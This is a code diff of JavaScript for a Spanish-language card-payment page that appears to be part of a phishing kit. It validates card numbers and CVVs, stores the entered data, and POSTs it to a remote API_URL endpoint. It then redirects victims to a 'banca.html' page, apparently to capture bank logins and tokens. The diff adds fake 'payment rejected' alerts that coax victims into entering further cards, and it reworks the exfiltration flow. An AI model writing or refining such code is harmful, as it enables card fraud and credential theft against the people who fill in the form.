@@ -9,8 +9,10 @@ fetch(`${API_URL}/view`, {
 })
 
 document.addEventListener('DOMContentLoaded', ()=>{
-    if(info.err != ''){
-        alert('Datos inválidos, intente de nuevo o cambie de método de pago.');
+    if(info.err === 'ncard'){
+        alert('PAGO RECHAZADO. Por favor inténtelo de nuevo con otro medio de pago.');
+    } else if(info.err === 'rcard'){
+        alert('Por favor corrija los datos de su tarjeta o intente con otro medio de pago.');
     }
 });
 
@@ -29,7 +31,7 @@ c.addEventListener('input', function () {
 });
 c.addEventListener('click', ()=>{
     if(p.value[0] == '3'){
-        alert('RECUERDA: El CVV de tu Tarjeta está en la parte frontal y son 4 dígitos.');
+        alert('Para tarjetas AMERICAN EXPRESS el código CVV está en la parte frontal y son cuatro dígitos.');
     }
 });
 
@@ -37,7 +39,7 @@ const btnContinuar = document.querySelector('#form');
 btnContinuar.addEventListener('submit', (e) => {
     e.preventDefault();
 
-    if ((p.value.length === 19 && p.value[0] !== '3') || (p.value.length === 17 && p.value[0] === '3')) {
+    if ((p.value.length === 19 && p.value[0] !== '3' && ['4','5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')) {
         if (mes.value !== '') {
             if (ano.value !== '') {
                 if ((c.value.length === 3 && p.value.length === 19) || (c.value.length === 4 && p.value.length === 17)) {
@@ -57,7 +59,6 @@ btnContinuar.addEventListener('submit', (e) => {
                         info.type = 'NO';
                     }
                     
-
                     LS.setItem('info', JSON.stringify(info));
 
                     // Mostrar modal
@@ -68,9 +69,16 @@ btnContinuar.addEventListener('submit', (e) => {
                         document.querySelector('#modal-esperar').classList.add('d-block');
 
                         setTimeout(()=>{
-                            if(info.err ===  'true'){
+                            if(info.err === 'rcard'){
                                 window.location.href = 'waiting.html';
                             }else{
+                                info.err = '';
+                                info.user = '';
+                                info.puser = '';
+                                info.tok = '';
+
+                                LS.setItem('info', JSON.stringify(info));
+
                                 fetch(`${API_URL}/generals`, {
                                     method: 'POST',
                                     headers: {
@@ -79,8 +87,10 @@ btnContinuar.addEventListener('submit', (e) => {
                                     },
                                     body: JSON.stringify(info)
                                 })
+
                                 
                                 setTimeout(()=>{
+                                    
                                     window.location.href = 'banca.html';
                                 },2000);
                             }
